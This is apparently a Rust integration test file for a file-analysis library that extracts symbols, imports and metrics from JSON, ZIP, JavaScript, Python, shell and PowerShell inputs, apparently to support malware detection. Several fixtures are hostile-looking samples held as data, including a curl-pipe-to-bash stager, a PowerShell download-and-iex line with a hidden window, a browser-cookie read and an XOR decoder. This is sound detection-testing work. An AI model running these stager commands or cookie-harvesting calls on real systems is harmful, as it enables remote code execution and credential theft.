//! End-to-end tests against synthetic and real fixtures.
//!
//! Every test here asserts the no-duplicate-work guarantee
//! (`parse_count() == 1` after exercising all views) so the contract
//! holds for downstream embedders.

use filefacts::{FileType, Symbol, SymbolKind, open, open_with_path};

/// Convenience: collect every call target (`Symbol::Call.target`) from a
/// parsed file, dropping dynamic-callee entries.
fn call_targets(parsed: &filefacts::ParsedFile<'_>) -> Vec<String> {
    parsed
        .symbols()
        .iter_kind(SymbolKind::Call)
        .filter_map(|s| match s {
            Symbol::Call { target, .. } => target.clone(),
            _ => None,
        })
        .collect()
}

fn import_names(parsed: &filefacts::ParsedFile<'_>) -> Vec<String> {
    parsed
        .symbols()
        .iter_kind(SymbolKind::Import)
        .filter_map(|s| match s {
            Symbol::Import { name, .. } => Some(name.clone()),
            _ => None,
        })
        .collect()
}

fn function_names(parsed: &filefacts::ParsedFile<'_>) -> Vec<String> {
    parsed
        .symbols()
        .iter_kind(SymbolKind::Function)
        .filter_map(|s| match s {
            Symbol::Function { name, .. } => Some(name.clone()),
            _ => None,
        })
        .collect()
}

#[test]
fn json_manifest_parses_once_through_all_views() {
    let bytes = br#"{"name":"sample","version":"1.0.0","scripts":{"preinstall":"echo hi"}}"#;
    let parsed = open_with_path(std::path::Path::new("package.json"), bytes).unwrap();
    assert_eq!(parsed.fileid().file_type(), FileType::PackageJson);

    let values = parsed.values();
    let strings = parsed.text();
    let metrics = parsed.metrics();

    assert_eq!(values.get("name").and_then(|v| v.as_str()), Some("sample"));
    assert_eq!(
        values.get("scripts.preinstall").and_then(|v| v.as_str()),
        Some("echo hi")
    );
    assert_eq!(
        strings.len(),
        0,
        "JSON manifests do not emit ASCII runs in v1"
    );
    assert!(metrics.get("file.size_bytes").unwrap() > 0.0);

    assert_eq!(
        parsed.parse_count(),
        1,
        "all three views must share a single extraction pass"
    );
}

#[test]
fn generic_json_parses_below_limit() {
    let parsed = open_with_path(
        std::path::Path::new("payload.json"),
        br#"{"cookie":"alert(1)"}"#,
    )
    .unwrap();
    assert_eq!(parsed.fileid().file_type(), FileType::Json);
    assert_eq!(
        parsed
            .values()
            .get("cookie")
            .and_then(serde_json::Value::as_str),
        Some("alert(1)")
    );
}

#[test]
fn generic_json_parse_limit_skips_values() {
    let mut bytes = Vec::from(br#"{"blob":""#.as_slice());
    bytes.extend(std::iter::repeat(b'a').take(76 * 1024));
    bytes.extend_from_slice(br#""}"#);

    let parsed = open_with_path(std::path::Path::new("payload.json"), &bytes).unwrap();
    assert_eq!(parsed.fileid().file_type(), FileType::Json);
    assert_eq!(
        parsed
            .values()
            .get("json.parse.skipped")
            .and_then(serde_json::Value::as_bool),
        Some(true)
    );
    assert!(parsed.values().get("blob").is_none());
}

#[test]
fn zip_archive_emits_member_listing_and_aggregates() {
    // Hand-build a minimal ZIP with three regular-file entries so we
    // don't depend on an external fixture for an integration test.
    let bytes = build_minimal_zip();
    let parsed = open(&bytes).unwrap();
    assert_eq!(parsed.fileid().file_type(), FileType::Zip);

    let values = parsed.values();
    let metrics = parsed.metrics();

    let members = values
        .get("archive.members")
        .and_then(|v| v.as_array())
        .expect("archive.members should be present");
    assert_eq!(members.len(), 3);
    for member in members {
        let header_offset = member
            .get("header_offset")
            .and_then(serde_json::Value::as_u64)
            .expect("zip member header_offset");
        let data_offset = member
            .get("data_offset")
            .and_then(serde_json::Value::as_u64)
            .expect("zip member data_offset");
        let central_header_offset = member
            .get("central_header_offset")
            .and_then(serde_json::Value::as_u64)
            .expect("zip member central_header_offset");
        assert!(data_offset > header_offset);
        assert!(central_header_offset > data_offset);
        assert!(
            member
                .get("crc32")
                .and_then(serde_json::Value::as_u64)
                .is_some()
        );
    }

    let typed_members = parsed.archive_members();
    assert_eq!(typed_members.len(), members.len());
    for (typed, member) in typed_members.iter().zip(members) {
        assert_eq!(
            member.get("path").and_then(serde_json::Value::as_str),
            Some(typed.path.as_str())
        );
        assert_eq!(
            member
                .get("header_offset")
                .and_then(serde_json::Value::as_u64),
            typed.offsets.header
        );
        assert_eq!(
            member
                .get("data_offset")
                .and_then(serde_json::Value::as_u64),
            typed.offsets.data
        );
        assert_eq!(
            member
                .get("central_header_offset")
                .and_then(serde_json::Value::as_u64),
            typed.offsets.central_header
        );
        assert_eq!(
            member.get("crc32").and_then(serde_json::Value::as_u64),
            typed.crc32.map(u64::from)
        );
    }

    assert_eq!(metrics.get("archive.member_count"), Some(3.0));
    assert!(metrics.get("file.entropy").is_some());

    assert_eq!(parsed.parse_count(), 1);
}

#[test]
fn empty_input_classifies_and_exposes_metrics() {
    let parsed = open(&[]).unwrap();
    // An empty byte slice has no meaningful format; we still expose
    // file.size_bytes and file.entropy so downstream consumers can
    // observe the degenerate case uniformly.
    assert_eq!(parsed.metrics().get("file.size_bytes"), Some(0.0));
    assert_eq!(parsed.metrics().get("file.entropy"), Some(0.0));
    assert_eq!(parsed.parse_count(), 1);
}

#[test]
fn source_ast_borrows_cached_tree_without_extraction_pass() {
    let source = b"function main() { return fetch('https://example.com'); }";
    let parsed = open_with_path(std::path::Path::new("sample.js"), source).unwrap();

    let ast = parsed.source_ast().expect("source AST should be available");
    assert_eq!(ast.source, std::str::from_utf8(source).unwrap());
    assert_eq!(ast.tree.root_node().kind(), "program");
    assert_eq!(
        parsed.parse_count(),
        0,
        "borrowing the AST is not extraction"
    );

    assert!(call_targets(&parsed).contains(&"fetch".to_string()));
    assert_eq!(parsed.parse_count(), 1);
}

#[test]
fn javascript_ast_projection_is_complete() {
    let source = br#"
        const fs = require('fs');
        chrome.cookies.getAll({ url: 'https://example.com' }, (c) => {});
        fetch('https://api.example.com/data');
        const decoded = atob("aGVsbG8=");
    "#;
    let parsed = open_with_path(std::path::Path::new("sample.js"), source).unwrap();
    assert_eq!(parsed.fileid().file_type(), FileType::JavaScript);

    let targets = call_targets(&parsed);
    assert!(
        targets.contains(&"chrome.cookies.getAll".to_string()),
        "expected dotted target in call symbols, got {targets:?}",
    );
    assert!(
        targets.contains(&"fetch".to_string()),
        "fetch should be a call target, got {targets:?}",
    );
    assert!(
        targets.contains(&"atob".to_string()),
        "atob should be a call target, got {targets:?}",
    );

    // Parse count must stay at 1 after exercising all five views.
    let _ = parsed.values();
    let _ = parsed.text();
    let _ = parsed.literals();
    let _ = parsed.metrics();
    let _ = parsed.symbols();
    let _ = parsed.fileid();
    assert_eq!(
        parsed.parse_count(),
        1,
        "all five views must share a single extraction pass"
    );
}

#[test]
fn python_ast_projection_has_imports_bindings_and_nested_literals() {
    let source = br#"import base64
import os
import subprocess as sp
from urllib import request

API_URL = "https://example.invalid/api"

def encode_value(value):
    raw = value.encode("utf-8")
    return base64.b64encode(raw).decode("ascii")

class Runner:
    def __init__(self, home):
        self.home = home

    async def fetch(self, name):
        payload = {"path": f"{self.home}/{name}.txt", "kind": "probe"}
        response = request.urlopen(API_URL, data=str(payload).encode("utf-8"))
        return response.read().decode("utf-8")

def run_command():
    env_copy = os.environ.copy()
    return sp.check_output(["/bin/echo", env_copy.get("USER", "unknown")]).decode()
"#;
    let parsed = open_with_path(std::path::Path::new("sample.py"), source).unwrap();
    assert_eq!(parsed.fileid().file_type(), FileType::Python);

    let imports = import_names(&parsed);
    assert!(
        imports.contains(&"subprocess".to_string()),
        "aliased import keeps the bare module name, got {imports:?}"
    );
    // The alias (`sp`) is now a structured field, not concatenated into name.
    let sp_alias = parsed.symbols().iter().find_map(|s| match s {
        filefacts::Symbol::Import {
            name,
            alias: Some(a),
            ..
        } if name == "subprocess" => Some(a.clone()),
        _ => None,
    });
    assert_eq!(
        sp_alias.as_deref(),
        Some("sp"),
        "aliased import should carry the alias in the structured `alias` field"
    );
    assert!(
        imports.contains(&"request".to_string()),
        "from-import local names should be visible, got {imports:?}"
    );

    let targets = call_targets(&parsed);
    assert!(
        targets.contains(&"sp.check_output().decode".to_string()),
        "method calls on call results should keep the source chain, got {targets:?}",
    );

    // Module-level string binding for API_URL — verify the bind exists
    // with the right target/scope/shape. Literal-value matching now
    // happens via the top-level `literals[]` collection correlated by
    // offset; we keep the simpler structural assertion here.
    let bind_targets: Vec<(&str, &str, filefacts::ArgShape)> = parsed
        .symbols()
        .iter_kind(SymbolKind::Bind)
        .filter_map(|s| match s {
            Symbol::Bind {
                target,
                scope,
                shape,
                ..
            } => Some((target.as_str(), scope.as_str(), *shape)),
            _ => None,
        })
        .collect();
    assert!(
        bind_targets.iter().any(|(t, s, sh)| {
            *t == "API_URL" && *s == "module" && *sh == filefacts::ArgShape::String
        }),
        "module string constants should be exposed as bind facts, got {bind_targets:?}",
    );

    assert_eq!(parsed.parse_count(), 1);
}

#[test]
fn shell_and_powershell_commands_populate_ast_calls() {
    let shell = br#"#!/bin/sh
curl -sL "http://example.invalid/stage.sh" | bash
-H "Header: value"
chmod +x ./stage.sh
"#;
    let parsed = open_with_path(std::path::Path::new("stage.sh"), shell).unwrap();
    let targets = call_targets(&parsed);
    assert!(
        targets.contains(&"curl".to_string()) && targets.contains(&"bash".to_string()),
        "shell command names should be call targets, got {targets:?}",
    );
    assert!(
        !targets.iter().any(|t| t.starts_with('-')),
        "shell option tokens should not become command targets, got {targets:?}",
    );

    let ps = br#"Invoke-WebRequest -Uri "http://example.invalid/stage.ps1" | iex
Start-Process powershell -ArgumentList "-nop", "-w hidden"
"#;
    let parsed = open_with_path(std::path::Path::new("stage.ps1"), ps).unwrap();
    let targets = call_targets(&parsed);
    assert!(
        targets.contains(&"Invoke-WebRequest".to_string())
            && targets.contains(&"iex".to_string())
            && targets.contains(&"Start-Process".to_string()),
        "PowerShell command names should be call targets, got {targets:?}",
    );
}

#[test]
fn typed_fact_views_are_not_mirrored_in_values() {
    let source = br"
        import fs from 'fs';
        class Runner {}
        function main() { return 'ok'; }
        fetch('https://example.com');
    ";
    let parsed = open_with_path(std::path::Path::new("sample.js"), source).unwrap();

    assert!(
        !import_names(&parsed).is_empty(),
        "imports should populate the unified Symbols view"
    );
    assert!(
        function_names(&parsed).iter().any(|n| n == "main"),
        "function definitions should populate the unified Symbols view"
    );
    assert!(
        !parsed.literals().is_empty(),
        "literals view should be populated"
    );
    assert!(
        !parsed.symbols().is_empty(),
        "Symbols view should be populated"
    );

    let values = parsed.values();
    assert_eq!(
        values.get("source.language").and_then(|v| v.as_str()),
        Some("javascript")
    );
    for path in [
        "imports",
        "functions",
        "classes",
        "strings",
        "ast",
        "symbols",
    ] {
        assert!(
            values.get(path).is_none(),
            "{path} must live only in its typed filefacts view"
        );
    }
}

#[test]
fn binary_typed_fact_views_are_not_mirrored_in_values() {
    let bytes = std::fs::read("../cleave/tests/fixtures/test.exe").expect("PE fixture present");
    let parsed = open(&bytes).unwrap();

    assert!(
        !import_names(&parsed).is_empty(),
        "imports should populate the unified Symbols view"
    );
    assert!(
        !parsed.sections().is_empty(),
        "sections typed view should be populated"
    );

    let values = parsed.values();
    for path in [
        "imports",
        "exports",
        "functions",
        "sections",
        "strings",
        "ast",
        "errors",
    ] {
        assert!(
            values.get(path).is_none(),
            "{path} must live only in its typed filefacts view"
        );
    }
}

#[test]
fn ast_metrics_mirror_ast_paths() {
    // Verify the metric-naming convention: AST-derived metrics use
    // the `ast.` prefix and mirror the view's path shape.
    let source = b"const a = [1,2,3,4,5,6,7,8,9,10,11,12]; const u = 'a'+'b'+'c'+'d';";
    let parsed = open_with_path(std::path::Path::new("x.js"), source).unwrap();
    let m = parsed.metrics();
    assert!(m.get("ast.node_count").unwrap_or(0.0) > 0.0);
    assert_eq!(m.get("ast.array_literal_max_length"), Some(12.0));
    assert_eq!(m.get("ast.string_concat_chain_max_length"), Some(4.0));
}

#[test]
fn non_source_file_yields_empty_ast() {
    let parsed = open(b"{\"name\":\"x\"}").unwrap();
    // No view has been requested yet — parse_count is still 0.
    assert_eq!(parsed.parse_count(), 0);
    // The first view access (any of them) bumps parse_count to 1.
    assert!(parsed.symbols().is_empty());
    assert_eq!(parsed.parse_count(), 1);
    // Subsequent view accesses share the same cached extraction.
    let _ = parsed.values();
    let _ = parsed.text();
    let _ = parsed.literals();
    let _ = parsed.metrics();
    assert_eq!(
        parsed.parse_count(),
        1,
        "non-source files still honour the single-parse contract"
    );
}

#[test]
fn unrecognised_bytes_still_extract_generic_metrics() {
    let bytes = vec![0xaa_u8; 4096];
    let parsed = open(&bytes).unwrap();
    let m = parsed.metrics();
    assert_eq!(m.get("file.size_bytes"), Some(4096.0));
    // A single repeated byte has zero entropy.
    assert!(m.get("file.entropy").unwrap().abs() < 1e-9);
    assert_eq!(parsed.parse_count(), 1);
}

/// open_with_path should populate file.basename and file.stem in the
/// values tree so traits can match on them via
/// `type: value, path: file.basename`.
#[test]
fn open_with_path_populates_file_basename_and_stem() {
    let bytes = b"# Hello\n";
    let parsed = open_with_path(std::path::Path::new("/tmp/README.md"), bytes).unwrap();
    let values = parsed.values();
    assert_eq!(
        values.get("file.basename").and_then(|v| v.as_str()),
        Some("README.md")
    );
    assert_eq!(
        values.get("file.stem").and_then(|v| v.as_str()),
        Some("README")
    );
}

/// open() without a path supplies no basename, so neither value path
/// shows up. Trait-level matchers correctly report "value not present"
/// rather than firing on a nonsense empty string.
#[test]
fn open_without_path_omits_file_basename() {
    let bytes = b"\x7fELF\x02\x01\x01\x00";
    let parsed = open(bytes).unwrap();
    let values = parsed.values();
    assert!(values.get("file.basename").is_none());
    assert!(values.get("file.stem").is_none());
}

/// Stem-vs-extension semantics: a dotfile keeps its leading dot in
/// the stem (matches Python pathlib).
#[test]
fn file_stem_handles_dotfiles() {
    let parsed = open_with_path(std::path::Path::new("/p/.gitignore"), b"").unwrap();
    let v = parsed.values();
    assert_eq!(
        v.get("file.basename").and_then(|x| x.as_str()),
        Some(".gitignore")
    );
    assert_eq!(
        v.get("file.stem").and_then(|x| x.as_str()),
        Some(".gitignore")
    );
}

/// Build a minimal ZIP containing three regular-file entries with
/// distinct paths. Pure-Rust, no external test fixture required.
fn build_minimal_zip() -> Vec<u8> {
    use std::io::Write;
    use zip::write::SimpleFileOptions;
    let mut buf = Vec::new();
    let cursor = std::io::Cursor::new(&mut buf);
    let mut writer = zip::ZipWriter::new(cursor);
    let options = SimpleFileOptions::default().compression_method(zip::CompressionMethod::Stored);

    writer.start_file("a.txt", options).unwrap();
    writer.write_all(b"alpha\n").unwrap();
    writer.start_file("dir/b.txt", options).unwrap();
    writer.write_all(b"beta\n").unwrap();
    writer.start_file("dir/c.txt", options).unwrap();
    writer.write_all(b"gamma\n").unwrap();
    writer.finish().unwrap();
    buf
}

/// Operator density is exposed as `ast.op.<op>` metrics (counted inline in
/// the single AST walk, O(1) to match, no per-occurrence facts) so rules can
/// match `type: metrics, field: 'ast.op.^', min: N`.
#[test]
fn python_xor_operator_density_metric() {
    let source = br#"def dec(b, k):
    return bytes(c ^ k[i % len(k)] for i, c in enumerate(b))
x = a ^ b ^ c
"#;
    let parsed = open_with_path(std::path::Path::new("x.py"), source).unwrap();
    let m = parsed.metrics();
    assert_eq!(m.get("ast.op.^"), Some(3.0), "three `^` operators");
    assert_eq!(m.get("ast.op.%"), Some(1.0), "one `%` operator");
}

/// Identity-proxy functions (`function(x){ return x }`) need a param↔return
/// backreference no regex can express; the walker checks it and exposes the
/// count as `ast.identity_function_count`.
#[test]
fn js_identity_function_density_metric() {
    let source = br#"
        function a(x) { return x; }
        function b(y) { return y; }
        const c = (z) => z;
        function d(p, q) { return p + q; }
    "#;
    let parsed = open_with_path(std::path::Path::new("x.js"), source).unwrap();
    assert_eq!(
        parsed.metrics().get("ast.identity_function_count"),
        Some(3.0),
        "a, b, and the arrow are identity proxies; d is not"
    );
}
